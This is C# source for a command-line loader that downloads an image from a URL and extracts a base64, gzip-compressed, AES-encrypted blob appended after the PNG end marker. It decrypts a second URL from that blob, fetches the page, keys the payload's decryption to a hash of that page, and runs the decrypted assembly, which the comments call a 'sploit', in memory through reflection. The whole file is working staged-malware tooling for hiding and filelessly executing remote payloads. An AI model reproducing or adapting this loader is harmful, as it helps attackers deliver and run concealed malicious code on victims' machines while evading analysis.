using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Reflection;
using System.IO.Compression;
using System.Security;
using System.Security.Cryptography;

namespace ConsoleLauncher
{
    class Enc
    {
        public static byte[] aes_decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] iv)
        {
            byte[] decryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.Padding = PaddingMode.ANSIX923;
                    AES.Key = passwordBytes;
                    AES.IV = iv;
                    AES.Mode = CipherMode.CBC;
                    try
                    {
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.FlushFinalBlock();
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.WriteLine("Error in decryption process");
                        Environment.Exit(1);
                    }
                }
            }
            return decryptedBytes;
        }

        public static byte[] depadit(byte[] input)
        {
            int length = 0;
            for (int i = 0; i < input.Length; i++)
            {
                if (i < 16 || input.Length == 128) // small files issue
                {
                    if (input[i] == 0x11)
                    {
                        length++;
                        if (input[i + 1] == 0xff)
                        {
                            length++;
                            break;
                        }
                    }
                }
            }
            byte[] ret = new byte[input.Length - length];
            Array.Copy(input, length, ret, 0, input.Length - length);
            return ret;
        }

        public static byte[] decrypt_small_pass(String pass, byte[] data, byte[] salt)
        {
            var key = new Rfc2898DeriveBytes(pass, salt, 7195);//<--
            byte[] out_data = Enc.aes_decrypt(data, key.GetBytes(16), salt);
            return out_data;
        }
    }
    
    class Program
    {

        public static bool test_file(String file) { if (File.Exists(file)) { return true; } else { return false; } }

        static byte[] hash_page(byte[] url_data, int offset)
        {
            SHA512Managed make_hash = new SHA512Managed();
            Byte[] hash = make_hash.ComputeHash(url_data, offset, url_data.Length - offset);
            return hash;
        }

        public static byte[] base64_decode(byte[] encodedData)
        {
            try { 
            string s = System.Text.Encoding.UTF8.GetString(encodedData, 0, encodedData.Length);
            byte[] encodedDataAsBytes = Convert.FromBase64String(s);
            return encodedDataAsBytes; }
            catch { Console.WriteLine("Issue with base64.. offset?");return null;}
        }

        public static byte[] decompress_bin(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }

        public static byte[] get_page(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }
                var buffer = new byte[4096];
                HttpWebResponse httpResponse = (HttpWebResponse)myWebRequest.GetResponse();
                using (var ms = new MemoryStream())
                {
                    using (var reader = new BinaryReader(httpResponse.GetResponseStream()))
                    {
                        int bytesRead;
                        while ((bytesRead = reader.Read(buffer, 0, 4096)) > 0)
                        {
                            ms.Write(buffer, 0, bytesRead);
                        }
                    }
                    return ms.ToArray();
                }
            }
            catch (Exception)
            {
                Console.WriteLine("there was a issue with the url...");
                Environment.Exit(1);
                return null;
            }
        }

        //if you need it!
        public static int do_png(Byte[] f)
        {int p=0;for(int i=0;i<f.Length;i++){if(f[i]==0x49){if(f[i+1]==0x45){if(f[i+2]==0x4e){if(f[i+3]==0x44){p=(i+4)+4;}}}}}return p;}

        static void load_app(byte[] decrypted_sploit_bytes, string[] prog_args)
        {
            Assembly a = Assembly.Load(decrypted_sploit_bytes);
            MethodInfo method = a.EntryPoint;
            if (method != null)
            {
                Object o = a.CreateInstance(method.Name);
                try
                {
                    method.Invoke(o, new Object[] { prog_args }); //alloverherface
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        public static byte[] stub_launch(byte[] url_data, string enc_pass, int png_offset, int pass_offset)
        {   // this was NOT easy.
            Byte[] salt = { 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2 }; //change
            Byte[] b64_data_only = new Byte[url_data.Length - png_offset];
            Buffer.BlockCopy(url_data, png_offset, b64_data_only, 0, url_data.Length - png_offset);
            Byte[] comp_data = base64_decode(b64_data_only);
            Byte[] enc_data = decompress_bin(comp_data);
            int nn = enc_data[0] + (enc_data[1] << 8);
            Byte[] enc_pre_pass = new Byte[nn];
            Array.Copy(enc_data, 2, enc_pre_pass, 0, enc_pre_pass.Length);
            Byte[] decrypted_url_pass = Enc.decrypt_small_pass(enc_pass, enc_pre_pass, salt);
            Byte[] url_pass = Enc.depadit(decrypted_url_pass);
            int enc_data_offset = enc_pre_pass.Length + 2;
            String nurl = Encoding.UTF8.GetString(url_pass);
            Byte[] enc_page; if (test_file(nurl)) { enc_page = File.ReadAllBytes(nurl); } else { enc_page = get_page(nurl); }
            Byte[] master_pass = hash_page(enc_page, pass_offset);
            Byte[] pass = new Byte[0x20]; Array.Copy(master_pass, master_pass.Length / 4, pass, 0, master_pass.Length / 2);
            Byte[] pass_4 = new Byte[0x10]; Array.Copy(master_pass, master_pass.Length / 8, pass_4, 0, master_pass.Length / 4);
            Byte[] enc_sploit_data = new Byte[enc_data.Length - enc_data_offset];
            Array.Copy(enc_data, enc_data_offset, enc_sploit_data, 0, enc_sploit_data.Length);
            Byte[] decrypted_sploit_bytes = Enc.aes_decrypt(enc_sploit_data, pass, pass_4); //moneyshot
            return decrypted_sploit_bytes;
        }

        public static void Main(string[] args)
        {
            if (args.Length < 4)
            {
                Console.WriteLine("Usage: loader.exe <url> <password> <png_offset> <pass_offset> <program_args>");
                Environment.Exit(1);
            }
            String url = args[0];
            String pass = args[1];
            int png_offset = Int32.Parse(args[2]);
            int pass_offset = Int32.Parse(args[3]);
            byte[] page_bytes = get_page(url);
            String[] prog_args = new String[args.Length - 4];
            Array.Copy(args, 1, prog_args, 0, args.Length - 4);
            Byte[] program = stub_launch(page_bytes, pass, png_offset, pass_offset);
            load_app(program, prog_args);
        }
    }
}
